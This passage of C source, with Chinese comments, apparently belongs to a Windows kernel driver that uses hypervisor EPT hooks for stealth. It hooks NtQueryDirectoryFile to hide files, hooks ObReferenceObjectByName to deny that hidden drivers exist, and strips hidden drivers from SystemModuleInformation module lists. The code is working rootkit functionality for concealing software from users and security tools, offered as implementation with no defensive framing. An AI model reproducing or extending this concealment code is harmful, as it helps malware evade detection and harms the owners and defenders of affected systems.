    _In_ PCWSTR FileName
)
{
    KIRQL oldIrql;
    PCWSTR baseName;
    ULONG i;
    BOOLEAN found = FALSE;
    
    if (!FileName || !g_HiddenFileLockInitialized) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 提取文件名
    baseName = wcsrchr(FileName, L'\\');
    if (baseName) {
        baseName++;
    } else {
        baseName = FileName;
    }
    
    DbgPrint("[EPT-Hook] Removing file from hidden list: %ws\n", baseName);
    
    KeAcquireSpinLock(&g_HiddenFileLock, &oldIrql);
    
    for (i = 0; i < g_HiddenFileCount && i < MAX_HIDDEN_FILES_EPT; i++) {
        if (_wcsicmp(g_HiddenFileNames[i], baseName) == 0) {
            // 将后面的元素前移
            for (ULONG j = i; j < g_HiddenFileCount - 1 && j < MAX_HIDDEN_FILES_EPT - 1; j++) {
                wcscpy_s(g_HiddenFileNames[j], MAX_FILE_NAME_LEN, g_HiddenFileNames[j + 1]);
            }
            g_HiddenFileNames[g_HiddenFileCount - 1][0] = L'\0';
            g_HiddenFileCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_HiddenFileLock, oldIrql);
    
    if (found) {
        DbgPrint("[EPT-Hook] File removed, count=%d\n", g_HiddenFileCount);
        return STATUS_SUCCESS;
    }
    
    return STATUS_NOT_FOUND;
}

/*
 * 安装文件隐藏 Hook
 */
NTSTATUS
EptHookInstallFileHideHook(VOID)
{
    UNICODE_STRING funcName;
    PVOID ntQueryDirectoryFile;
    
    DbgPrint("[EPT-Hook] Installing NtQueryDirectoryFile hook...\n");
    
    // 获取 NtQueryDirectoryFile 地址
    RtlInitUnicodeString(&funcName, L"NtQueryDirectoryFile");
    ntQueryDirectoryFile = MmGetSystemRoutineAddress(&funcName);
    
    if (!ntQueryDirectoryFile) {
        DbgPrint("[EPT-Hook] Failed to find NtQueryDirectoryFile\n");
        return STATUS_NOT_FOUND;
    }
    
    return EptHookInstallFileHideHookAtAddress(ntQueryDirectoryFile);
}

NTSTATUS
EptHookInstallFileHideHookAtAddress(
    _In_ PVOID NtQueryDirectoryFileAddress
)
{
    NTSTATUS status;

    if (!NtQueryDirectoryFileAddress) {
        return STATUS_INVALID_PARAMETER;
    }
    if (!g_HiddenFileLockInitialized) {
        DbgPrint("[EPT-Hook] Warning: File hide lock not initialized\n");
        return STATUS_NOT_INITIALIZED;
    }
    if (g_NtQueryDirectoryFileHook != NULL) {
        return g_OriginalNtQueryDirectoryFile
            ? STATUS_SUCCESS
            : STATUS_DEVICE_NOT_READY;
    }

    DbgPrint("[EPT-Hook] NtQueryDirectoryFile implementation at %p\n",
             NtQueryDirectoryFileAddress);
    status = EptHookInstall(
        NtQueryDirectoryFileAddress,
        EptHookedNtQueryDirectoryFile,
        &g_NtQueryDirectoryFileHook
    );
    
    if (NT_SUCCESS(status)) {
        g_OriginalNtQueryDirectoryFile = 
            (PFN_NtQueryDirectoryFile)EptHookGetTrampoline(g_NtQueryDirectoryFileHook);
        if (!g_NtQueryDirectoryFileHook ||
            !g_OriginalNtQueryDirectoryFile) {
            if (g_NtQueryDirectoryFileHook) {
                (void)EptHookRemove(g_NtQueryDirectoryFileHook);
                g_NtQueryDirectoryFileHook = NULL;
            }
            g_OriginalNtQueryDirectoryFile = NULL;
            return STATUS_DEVICE_NOT_READY;
        }
        DbgPrint("[EPT-Hook] NtQueryDirectoryFile hook installed, trampoline at %p\n",
            g_OriginalNtQueryDirectoryFile);
    } else {
        DbgPrint("[EPT-Hook] Failed to install NtQueryDirectoryFile hook: 0x%X\n", status);
    }
    
    return status;
}

/*
 * 移除文件隐藏 Hook
 */
NTSTATUS
EptHookRemoveFileHideHook(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;
    
    if (g_NtQueryDirectoryFileHook) {
        DbgPrint("[EPT-Hook] Removing NtQueryDirectoryFile hook...\n");
        status = EptHookRemove(g_NtQueryDirectoryFileHook);
        if (NT_SUCCESS(status)) {
            g_NtQueryDirectoryFileHook = NULL;
            InterlockedExchangePointer(
                (PVOID volatile *)&g_OriginalNtQueryDirectoryFile,
                NULL);
        }
    }
    
    return status;
}

// ============================================================
// 高级功能：驱动隐藏（基于 EPT Hook，不修改任何内核结构）
// ============================================================

// 注意: MAX_HIDDEN_DRIVERS_EPT, MAX_DRIVER_NAME_LEN_EPT 和 g_HiddenDriver* 变量已在文件开头定义

typedef struct _HIDDEN_DRIVER_INFO_EPT {
    WCHAR DriverName[MAX_DRIVER_NAME_LEN_EPT];      // 驱动名称（如 "Netr.sys"）
    WCHAR ServiceName[MAX_DRIVER_NAME_LEN_EPT];     // 服务名称（如 "Netr"）
    PVOID DriverBase;                               // 驱动基址
    ULONG DriverSize;                               // 驱动大小
    BOOLEAN Active;                                 // 是否激活
} HIDDEN_DRIVER_INFO_EPT, *PHIDDEN_DRIVER_INFO_EPT;

static HIDDEN_DRIVER_INFO_EPT g_HiddenDrivers[MAX_HIDDEN_DRIVERS_EPT] = { 0 };

// ObReferenceObjectByName Hook 相关
typedef NTSTATUS (NTAPI *PFN_ObReferenceObjectByName)(
    _In_ PUNICODE_STRING ObjectName,
    _In_ ULONG Attributes,
    _In_opt_ PACCESS_STATE AccessState,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Inout_opt_ PVOID ParseContext,
    _Out_ PVOID* Object
);

NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
    _In_ PUNICODE_STRING ObjectName,
    _In_ ULONG Attributes,
    _In_opt_ PACCESS_STATE AccessState,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Inout_opt_ PVOID ParseContext,
    _Out_ PVOID* Object
);

extern POBJECT_TYPE* IoDriverObjectType;

static PFN_ObReferenceObjectByName g_OriginalObReferenceObjectByName = NULL;
static PEPT_HOOK_ENTRY g_ObReferenceObjectByNameHook = NULL;

/*
 * 初始化驱动隐藏锁（线程安全）
 * 使用 InterlockedCompareExchange 确保只有一个线程会初始化锁
 */
static VOID
EptInitHiddenDriverLock(VOID)
{
    // 使用原子比较交换来避免竞态条件
    // 只有当 g_HiddenDriverLockInitialized 为 FALSE 时才进行初始化
    if (InterlockedCompareExchange(&g_HiddenDriverLockInitialized, TRUE, FALSE) == FALSE) {
        KeInitializeSpinLock(&g_HiddenDriverLock);
        // 内存屏障确保锁初始化完成后其他 CPU 可见
        MemoryBarrier();
    } else {
        // 如果另一个线程正在初始化，等待它完成
        while (!g_HiddenDriverLockInitialized) {
            YieldProcessor();
        }
        MemoryBarrier();
    }
}

// ============================================================
// IRQL 安全的字符串比较函数
// 这些函数不会访问分页内存，可以在任意 IRQL 下安全调用
// ============================================================

/*
 * IRQL 安全的宽字符转小写（仅处理 ASCII 范围）
 */
static __forceinline WCHAR
EptToLowerW(WCHAR ch)
{
    if (ch >= L'A' && ch <= L'Z') {
        return ch + (L'a' - L'A');
    }
    return ch;
}

/*
 * IRQL 安全的 ANSI 字符转小写
 */
static __forceinline CHAR
EptToLowerA(CHAR ch)
{
    if (ch >= 'A' && ch <= 'Z') {
        return ch + ('a' - 'A');
    }
    return ch;
}

/*
 * IRQL 安全的宽字符串长度（带上限）
 */
static __forceinline SIZE_T
EptWcsLenSafe(
    _In_ PCWSTR Str,
    _In_ SIZE_T MaxChars
)
{
    SIZE_T len = 0;
    
    if (!Str || MaxChars == 0) {
        return 0;
    }
    
    while (len < MaxChars && Str[len] != L'\0') {
        len++;
    }
    
    return len;
}

/*
 * IRQL 安全的不区分大小写宽字符串比较
 * 不使用 locale 数据，只处理 ASCII 范围的大小写
 * 可以在 DISPATCH_LEVEL 及以上安全调用
 * 
 * @return TRUE 如果字符串相等（不区分大小写）
 */
static BOOLEAN
EptWcsIEqual(
    _In_ PCWSTR Str1,
    _In_ PCWSTR Str2
)
{
    if (!Str1 || !Str2) {
        return FALSE;
    }
    
    while (*Str1 && *Str2) {
        if (EptToLowerW(*Str1) != EptToLowerW(*Str2)) {
            return FALSE;
        }
        Str1++;
        Str2++;
    }
    
    return (*Str1 == *Str2);  // 都到达结尾
}

/*
 * IRQL 安全的不区分大小写宽字符串包含检查
 * 检查 Haystack 中是否包含 Needle（不区分大小写）
 * 
 * @return TRUE 如果 Haystack 包含 Needle
 */
static BOOLEAN
EptWcsIContains(
    _In_ PCWSTR Haystack,
    _In_ PCWSTR Needle
)
{
    SIZE_T needleLen;
    SIZE_T i;
    
    if (!Haystack || !Needle || *Needle == L'\0') {
        return FALSE;
    }
    
    // 避免使用 wcslen（可能触发分页访问），改为安全长度计算
    needleLen = EptWcsLenSafe(Needle, MAX_DRIVER_NAME_LEN_EPT);
    if (needleLen == 0) {
        return FALSE;
    }
    
    while (*Haystack) {
        // 检查从当前位置开始是否匹配
        BOOLEAN match = TRUE;
        for (i = 0; i < needleLen; i++) {
            if (Haystack[i] == L'\0') {
                return FALSE;  // Haystack 太短
            }
            if (EptToLowerW(Haystack[i]) != EptToLowerW(Needle[i])) {
                match = FALSE;
                break;
            }
        }
        if (match) {
            return TRUE;
        }
        Haystack++;
    }
    
    return FALSE;
}

/*
 * IRQL 安全的 ANSI 转宽字符（就地转换，仅处理 ASCII）
 * 不使用 NLS 表，可以在任意 IRQL 下安全调用
 * 
 * @param AnsiStr   输入的 ANSI 字符串
 * @param WideStr   输出的宽字符缓冲区
 * @param MaxChars  缓冲区最大字符数（包含 NULL 终止符）
 * @return 转换的字符数（不包含 NULL 终止符）
 */
static ULONG
EptAnsiToWideSafe(
    _In_ PCSTR AnsiStr,
    _Out_writes_(MaxChars) PWCHAR WideStr,
    _In_ ULONG MaxChars
)
{
    ULONG i = 0;
    
    if (!AnsiStr || !WideStr || MaxChars == 0) {
        if (WideStr && MaxChars > 0) {
            WideStr[0] = L'\0';
        }
        return 0;
    }
    
    // 简单的 ANSI 到 Unicode 转换（仅处理 ASCII，不使用 NLS）
    while (AnsiStr[i] && i < MaxChars - 1) {
        // 对于 ASCII 字符，直接转换
        // 对于高位字符（>127），保持原样（可能不正确，但安全）
        WideStr[i] = (WCHAR)(UCHAR)AnsiStr[i];
        i++;
    }
    WideStr[i] = L'\0';
    
    return i;
}

/*
 * 检查驱动名称是否应该被隐藏
 * 
 * 重要修复：
 * - 使用 IRQL 安全的字符串操作
 * - 在高 IRQL 下使用无锁读取（避免 SpinLock 蓝屏）
 * - 不使用 RtlAnsiStringToUnicodeString（可能访问分页的 NLS 表）
 * - 不使用 _wcsicmp（可能访问分页的 locale 数据）
 */
static BOOLEAN
EptIsDriverHidden(
    _In_ PCSTR DriverName
)
{
    KIRQL oldIrql;
    KIRQL currentIrql;
    ULONG i;
    WCHAR unicodeBuffer[MAX_DRIVER_NAME_LEN_EPT];
    ULONG count;
    
    if (!DriverName || !g_HiddenDriverLockInitialized) {
        return FALSE;
    }
    
    // 快速检查：在获取锁之前先检查计数
    // 使用 volatile 读取避免编译器优化
    count = *(volatile ULONG*)&g_HiddenDriverCount;
    if (count == 0) {
        return FALSE;
    }
    
    // 使用 IRQL 安全的 ANSI 转 Unicode 转换
    // 不使用 RtlAnsiStringToUnicodeString，因为它可能访问分页内存
    EptAnsiToWideSafe(DriverName, unicodeBuffer, MAX_DRIVER_NAME_LEN_EPT);
    
    // IRQL 检查：如果当前 IRQL 高于 DISPATCH_LEVEL，使用无锁读取
    // SpinLock 最高只能在 DISPATCH_LEVEL 使用，否则会蓝屏
    currentIrql = KeGetCurrentIrql();
    if (currentIrql > DISPATCH_LEVEL) {
        // 高 IRQL 下使用无锁读取（可能有轻微的竞态，但更安全）
        count = *(volatile ULONG*)&g_HiddenDriverCount;
        for (i = 0; i < count && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
            if (g_HiddenDrivers[i].Active) {
                if (EptWcsIEqual(g_HiddenDrivers[i].DriverName, unicodeBuffer)) {
                    return TRUE;
                }
                if (EptWcsIContains(unicodeBuffer, g_HiddenDrivers[i].DriverName)) {
                    return TRUE;
                }
            }
        }
        return FALSE;
    }
    
    // 正常 IRQL 下使用 SpinLock 保护
    KeAcquireSpinLock(&g_HiddenDriverLock, &oldIrql);
    
    for (i = 0; i < g_HiddenDriverCount && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
        if (g_HiddenDrivers[i].Active) {
            // 使用 IRQL 安全的字符串比较（不区分大小写）
            if (EptWcsIEqual(g_HiddenDrivers[i].DriverName, unicodeBuffer)) {
                KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
                return TRUE;
            }
            // 也检查路径中包含的情况
            if (EptWcsIContains(unicodeBuffer, g_HiddenDrivers[i].DriverName)) {
                KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
                return TRUE;
            }
        }
    }
    
    KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
    return FALSE;
}

/*
 * 检查驱动服务名是否应该被隐藏（用于 ObReferenceObjectByName）
 * 
 * 重要修复：
 * - 使用 IRQL 安全的字符串比较
 * - 在高 IRQL 下使用无锁读取
 */
static BOOLEAN
EptIsDriverServiceHidden(
    _In_ PCWSTR ServiceName
)
{
    KIRQL oldIrql;
    KIRQL currentIrql;
    ULONG i;
    ULONG count;
    
    if (!ServiceName || !g_HiddenDriverLockInitialized) {
        return FALSE;
    }
    
    // 快速检查：在获取锁之前先检查计数
    count = *(volatile ULONG*)&g_HiddenDriverCount;
    if (count == 0) {
        return FALSE;
    }
    
    // IRQL 检查：如果当前 IRQL 高于 DISPATCH_LEVEL，使用无锁读取
    currentIrql = KeGetCurrentIrql();
    if (currentIrql > DISPATCH_LEVEL) {
        count = *(volatile ULONG*)&g_HiddenDriverCount;
        for (i = 0; i < count && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
            if (g_HiddenDrivers[i].Active) {
                if (EptWcsIEqual(g_HiddenDrivers[i].ServiceName, ServiceName)) {
                    return TRUE;
                }
            }
        }
        return FALSE;
    }
    
    // 正常 IRQL 下使用 SpinLock 保护
    KeAcquireSpinLock(&g_HiddenDriverLock, &oldIrql);
    
    for (i = 0; i < g_HiddenDriverCount && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
        if (g_HiddenDrivers[i].Active) {
            // 使用 IRQL 安全的字符串比较
            if (EptWcsIEqual(g_HiddenDrivers[i].ServiceName, ServiceName)) {
                KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
                return TRUE;
            }
        }
    }
    
    KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
    return FALSE;
}

/*
 * 检查驱动基址是否应该被隐藏
 * 
 * 重要修复：在高 IRQL 下使用无锁读取
 */
static BOOLEAN
EptIsDriverBaseHidden(
    _In_ PVOID DriverBase
)
{
    KIRQL oldIrql;
    KIRQL currentIrql;
    ULONG i;
    ULONG count;
    
    if (!DriverBase || !g_HiddenDriverLockInitialized) {
        return FALSE;
    }
    
    // 快速检查
    count = *(volatile ULONG*)&g_HiddenDriverCount;
    if (count == 0) {
        return FALSE;
    }
    
    // IRQL 检查：如果当前 IRQL 高于 DISPATCH_LEVEL，使用无锁读取
    currentIrql = KeGetCurrentIrql();
    if (currentIrql > DISPATCH_LEVEL) {
        count = *(volatile ULONG*)&g_HiddenDriverCount;
        for (i = 0; i < count && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
            if (g_HiddenDrivers[i].Active && g_HiddenDrivers[i].DriverBase == DriverBase) {
                return TRUE;
            }
        }
        return FALSE;
    }
    
    // 正常 IRQL 下使用 SpinLock 保护
    KeAcquireSpinLock(&g_HiddenDriverLock, &oldIrql);
    
    for (i = 0; i < g_HiddenDriverCount && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
        if (g_HiddenDrivers[i].Active && g_HiddenDrivers[i].DriverBase == DriverBase) {
            KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
            return TRUE;
        }
    }
    
    KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
    return FALSE;
}

/*
 * 过滤 SystemModuleInformation 结果
 * 从模块列表中移除隐藏的驱动
 */
VOID
EptFilterModuleList(
    _Inout_ PRTL_PROCESS_MODULES_EPT ModuleInfo
)
{
    ULONG i, j;
    ULONG originalCount;
    ULONG removedCount = 0;
    
    if (!ModuleInfo || ModuleInfo->NumberOfModules == 0) {
        return;
    }
    
    originalCount = ModuleInfo->NumberOfModules;
    
    __try {
        for (i = 0; i < ModuleInfo->NumberOfModules; ) {
            PRTL_PROCESS_MODULE_INFORMATION_EPT module = &ModuleInfo->Modules[i];
            PCSTR fileName;
            
            // 获取文件名（从 OffsetToFileName 开始）
            if (module->OffsetToFileName < 256) {
                fileName = (PCSTR)&module->FullPathName[module->OffsetToFileName];
            } else {
                fileName = (PCSTR)module->FullPathName;
            }
            
            // 检查是否需要隐藏
            if (EptIsDriverHidden(fileName) || EptIsDriverBaseHidden(module->ImageBase)) {
                // 将后面的模块前移
                for (j = i; j < ModuleInfo->NumberOfModules - 1; j++) {
                    RtlCopyMemory(&ModuleInfo->Modules[j], 
                                  &ModuleInfo->Modules[j + 1],
                                  sizeof(RTL_PROCESS_MODULE_INFORMATION_EPT));
                }
                ModuleInfo->NumberOfModules--;
                removedCount++;
                // 不增加 i，因为当前位置已被下一个模块替换
            } else {
                i++;
            }
        }
        
        // 注意：移除 DbgPrint，因为此函数可能在高 IRQL 下被调用
        // DbgPrint 在某些情况下可能访问分页内存，导致 IRQL_NOT_LESS_OR_EQUAL
        // 如果需要调试，可以使用计数器在驱动卸载时打印
        UNREFERENCED_PARAMETER(removedCount);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
}

VOID
EptHookFilterModuleList(
    _Inout_updates_bytes_(ModuleInfoLength) PVOID ModuleInfo,
    _In_ ULONG ModuleInfoLength
)
{
    ULONG count;
    ULONG capacity;

    if (!ModuleInfo || ModuleInfoLength < sizeof(ULONG)) {
        return;
    }

    count = ((PRTL_PROCESS_MODULES_EPT)ModuleInfo)->NumberOfModules;
    capacity = (ModuleInfoLength - sizeof(ULONG)) /
        sizeof(RTL_PROCESS_MODULE_INFORMATION_EPT);
    if (count > capacity) {
        return;
    }

    EptFilterModuleList((PRTL_PROCESS_MODULES_EPT)ModuleInfo);
}

/*
 * IRQL 安全的查找最后一个反斜杠（替代 wcsrchr）
 * wcsrchr 通常是安全的，但为了确保在任何 IRQL 下都安全，使用内联版本
 */
static __forceinline PCWSTR
EptFindLastBackslash(
    _In_ PCWSTR Str,
    _In_ USHORT Length  // 字符串长度（字符数，不是字节数）
)
{
    PCWSTR result = NULL;
    USHORT i;
    
    if (!Str || Length == 0) {
        return NULL;
    }
    
    for (i = 0; i < Length && Str[i] != L'\0'; i++) {
        if (Str[i] == L'\\') {
            result = &Str[i];
        }
    }
    
    return result;
}

/*
 * Hooked ObReferenceObjectByName
 * 阻止通过名称查找隐藏的驱动对象
 * 
 * 重要修复：移除 DbgPrint，使用 IRQL 安全的字符串操作
 */
static NTSTATUS
NTAPI
EptHookedObReferenceObjectByName(
    _In_ PUNICODE_STRING ObjectName,
    _In_ ULONG Attributes,
    _In_opt_ PACCESS_STATE AccessState,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Inout_opt_ PVOID ParseContext,
    _Out_ PVOID* Object
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_ObReferenceObjectByNameHook)
    PFN_ObReferenceObjectByName originalFunc;
    WCHAR nameBuffer[MAX_DRIVER_NAME_LEN_EPT];
    
    originalFunc = g_OriginalObReferenceObjectByName;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 检查是否在查找驱动对象
    if (ObjectType == *IoDriverObjectType && ObjectName && ObjectName->Buffer) {
        // 只在 KernelMode 下访问 ObjectName，避免触碰用户指针
        if (AccessMode == KernelMode) {
            __try {
                USHORT nameChars = (USHORT)(ObjectName->Length / sizeof(WCHAR));
                USHORT copyChars = nameChars;
                
                if (copyChars >= MAX_DRIVER_NAME_LEN_EPT) {
                    copyChars = MAX_DRIVER_NAME_LEN_EPT - 1;
                }
                
                if (copyChars > 0) {
                    RtlCopyMemory(nameBuffer, ObjectName->Buffer, copyChars * sizeof(WCHAR));
                    nameBuffer[copyChars] = L'\0';
                    
                    // 检查是否是隐藏的驱动
                    // ObjectName 格式通常是 "\Driver\DriverName"
                    PCWSTR driverName = nameBuffer;
                    PCWSTR lastSlash;
                    
                    // 使用 IRQL 安全的查找函数
                    lastSlash = EptFindLastBackslash(driverName, copyChars);
                    if (lastSlash) {
                        driverName = lastSlash + 1;
                    }
                    
                    if (EptIsDriverServiceHidden(driverName)) {
                        // 注意：移除 DbgPrint 以避免在高 IRQL 下访问分页内存
                        // 如果需要调试，可以使用原子计数器在驱动卸载时统计
                        return STATUS_OBJECT_NAME_NOT_FOUND;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                // 忽略异常，避免触发 bugcheck
            }
        }
    }
    
    // 调用原始函数
    return originalFunc(
        ObjectName,
        Attributes,
        AccessState,
        DesiredAccess,
        ObjectType,
        AccessMode,
        ParseContext,
        Object
    );
    EPT_DIRECT_CALLBACK_END()
}

/*
 * 添加驱动到隐藏列表
 */
NTSTATUS
EptHookHideDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    KIRQL oldIrql;
    PKLDR_DATA_TABLE_ENTRY ldrEntry;
    PCWSTR baseName;
    SIZE_T nameLen;
    
    if (!DriverObject) {
        return STATUS_INVALID_PARAMETER;
    }
    
    EptInitHiddenDriverLock();
    
    // 获取 LDR_DATA_TABLE_ENTRY
    ldrEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!ldrEntry) {
        DbgPrint("[EPT-Hook] DriverSection is NULL\n");
        return STATUS_NOT_FOUND;
    }
    
    DbgPrint("[EPT-Hook] ========== Hiding Driver (EPT Hook Method) ==========\n");
    DbgPrint("[EPT-Hook] Driver Base: %p\n", ldrEntry->DllBase);
    DbgPrint("[EPT-Hook] Driver Size: 0x%X\n", ldrEntry->SizeOfImage);
    DbgPrint("[EPT-Hook] Driver Name: %wZ\n", &ldrEntry->BaseDllName);
    
    KeAcquireSpinLock(&g_HiddenDriverLock, &oldIrql);
    
    // 检查是否已存在
    for (ULONG i = 0; i < g_HiddenDriverCount && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
        if (g_HiddenDrivers[i].DriverBase == ldrEntry->DllBase) {
            KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
            DbgPrint("[EPT-Hook] Driver already in hidden list\n");
            return STATUS_SUCCESS;
        }
    }
    
    // 检查空间
    if (g_HiddenDriverCount >= MAX_HIDDEN_DRIVERS_EPT) {
        KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
        DbgPrint("[EPT-Hook] Hidden driver list full\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 添加到列表
    ULONG idx = g_HiddenDriverCount;
    g_HiddenDrivers[idx].DriverBase = ldrEntry->DllBase;
    g_HiddenDrivers[idx].DriverSize = ldrEntry->SizeOfImage;
    g_HiddenDrivers[idx].Active = TRUE;
    
    // 复制驱动名称
    if (ldrEntry->BaseDllName.Buffer && ldrEntry->BaseDllName.Length > 0) {
        nameLen = ldrEntry->BaseDllName.Length / sizeof(WCHAR);
        if (nameLen >= MAX_DRIVER_NAME_LEN_EPT) {
            nameLen = MAX_DRIVER_NAME_LEN_EPT - 1;
        }
        RtlCopyMemory(g_HiddenDrivers[idx].DriverName, 
                      ldrEntry->BaseDllName.Buffer,
                      nameLen * sizeof(WCHAR));
        g_HiddenDrivers[idx].DriverName[nameLen] = L'\0';
    }
    
    // 从驱动名称提取服务名（去掉 .sys 后缀）
    wcscpy_s(g_HiddenDrivers[idx].ServiceName, MAX_DRIVER_NAME_LEN_EPT, 
             g_HiddenDrivers[idx].DriverName);
    PWCHAR dotPos = wcsrchr(g_HiddenDrivers[idx].ServiceName, L'.');
    if (dotPos) {
        *dotPos = L'\0';
    }
    
    g_HiddenDriverCount++;
    
    KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
    
    DbgPrint("[EPT-Hook] Driver added to hidden list: %ws (Service: %ws)\n",
        g_HiddenDrivers[idx].DriverName, g_HiddenDrivers[idx].ServiceName);
    DbgPrint("[EPT-Hook] Hidden driver count: %d\n", g_HiddenDriverCount);
    DbgPrint("[EPT-Hook] =====================================================\n");
    
    return STATUS_SUCCESS;
}

/*
 * 通过名称添加驱动到隐藏列表
 */
NTSTATUS
EptHookHideDriverByName(
    _In_ PCWSTR DriverName
)
{
    NTSTATUS status;
    UNICODE_STRING driverPath;
    WCHAR fullPath[MAX_DRIVER_NAME_LEN_EPT];
    PDRIVER_OBJECT driverObject = NULL;
    
    if (!DriverName) {
        return STATUS_INVALID_PARAMETER;
    }
    
    EptInitHiddenDriverLock();
    
    DbgPrint("[EPT-Hook] Hiding driver by name: %ws\n", DriverName);
    
    // 构建完整路径
    RtlStringCchPrintfW(fullPath, MAX_DRIVER_NAME_LEN_EPT, L"\\Driver\\%ws", DriverName);
    RtlInitUnicodeString(&driverPath, fullPath);
    
    // 获取驱动对象
    status = ObReferenceObjectByName(
        &driverPath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        0,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        (PVOID*)&driverObject
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[EPT-Hook] Failed to find driver object: 0x%X\n", status);
        return status;
    }
    
    // 隐藏驱动
    status = EptHookHideDriver(driverObject);
    
    // 释放引用
    ObDereferenceObject(driverObject);
    
    return status;
}

/*
 * 从隐藏列表移除驱动
 */
NTSTATUS
EptHookUnhideDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    KIRQL oldIrql;
    PKLDR_DATA_TABLE_ENTRY ldrEntry;
    BOOLEAN found = FALSE;
    
    if (!DriverObject || !g_HiddenDriverLockInitialized) {
        return STATUS_INVALID_PARAMETER;
    }
    
    ldrEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!ldrEntry) {
        return STATUS_NOT_FOUND;
    }
    
    KeAcquireSpinLock(&g_HiddenDriverLock, &oldIrql);
    
    for (ULONG i = 0; i < g_HiddenDriverCount && i < MAX_HIDDEN_DRIVERS_EPT; i++) {
        if (g_HiddenDrivers[i].DriverBase == ldrEntry->DllBase) {
            // 将后面的条目前移
            for (ULONG j = i; j < g_HiddenDriverCount - 1 && j < MAX_HIDDEN_DRIVERS_EPT - 1; j++) {
                RtlCopyMemory(&g_HiddenDrivers[j], &g_HiddenDrivers[j + 1], sizeof(HIDDEN_DRIVER_INFO_EPT));
            }
            RtlZeroMemory(&g_HiddenDrivers[g_HiddenDriverCount - 1], sizeof(HIDDEN_DRIVER_INFO_EPT));
            g_HiddenDriverCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_HiddenDriverLock, oldIrql);
    
    if (found) {
        DbgPrint("[EPT-Hook] Driver removed from hidden list, count=%d\n", g_HiddenDriverCount);
        return STATUS_SUCCESS;
    }
    
    return STATUS_NOT_FOUND;
}

/*
 * 安装驱动隐藏 Hook
 * 包括 NtQuerySystemInformation(SystemModuleInformation) 和 ObReferenceObjectByName
 */
NTSTATUS
EptHookInstallDriverHideHook(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;
    UNICODE_STRING funcName;
    PVOID obRefByName;
    
    DbgPrint("[EPT-Hook] ========== Installing Driver Hide Hooks ==========\n");
    
    EptInitHiddenDriverLock();
    
    // 1. 确保 NtQuerySystemInformation Hook 已安装（进程隐藏也用这个）
    // 它已经由进程隐藏功能安装，我们只需确保它处理 SystemModuleInformation
    // ========================================
    // 2026-05-21: BISECT-3a 已解除。根因是多核 PTE 多字段写竞态(field-by-field 4 次 RMW)
    //   被 cmpxchg64 原子 PTE 更新修复(EptSetPteAtomic/EptOpenRwxKeepPfnAtomic)。
    // ========================================
    // 2026-06-18: NtQuerySystemInformation 已合并到 HvHook.c, 这里不再装第二份
    DbgPrint("[EPT-Hook] NtQuerySystemInformation hook handled by HvHook (merged) — driver hiding switched to HvHook\n");

    // 2. 安装 ObReferenceObjectByName Hook
    if (g_ObReferenceObjectByNameHook == NULL) {
        DbgPrint("[EPT-Hook] Installing ObReferenceObjectByName hook...\n");
        
        RtlInitUnicodeString(&funcName, L"ObReferenceObjectByName");
        obRefByName = MmGetSystemRoutineAddress(&funcName);
        
        if (obRefByName) {
            status = EptHookInstall(
                obRefByName,
                EptHookedObReferenceObjectByName,
                &g_ObReferenceObjectByNameHook
            );
            
            if (NT_SUCCESS(status)) {
                g_OriginalObReferenceObjectByName = 
                    (PFN_ObReferenceObjectByName)EptHookGetTrampoline(g_ObReferenceObjectByNameHook);
                if (!g_OriginalObReferenceObjectByName) {
                    NTSTATUS rollbackStatus =
                        EptHookRemove(g_ObReferenceObjectByNameHook);
                    g_ObReferenceObjectByNameHook = NULL;
                    DbgPrint("[EPT-Hook] ObReferenceObjectByName trampoline missing; rollback=0x%X\n",
                             rollbackStatus);
                    return STATUS_DEVICE_NOT_READY;
                }
                DbgPrint("[EPT-Hook] ObReferenceObjectByName hook installed, trampoline at %p\n",
                    g_OriginalObReferenceObjectByName);
            } else {
                DbgPrint("[EPT-Hook] Failed to install ObReferenceObjectByName hook: 0x%X\n", status);
                return status;
            }
        } else {
            DbgPrint("[EPT-Hook] ObReferenceObjectByName not found (not exported)\n");
            return STATUS_PROCEDURE_NOT_FOUND;
        }
    } else if (!g_OriginalObReferenceObjectByName) {
        return STATUS_DEVICE_NOT_READY;
    }
    
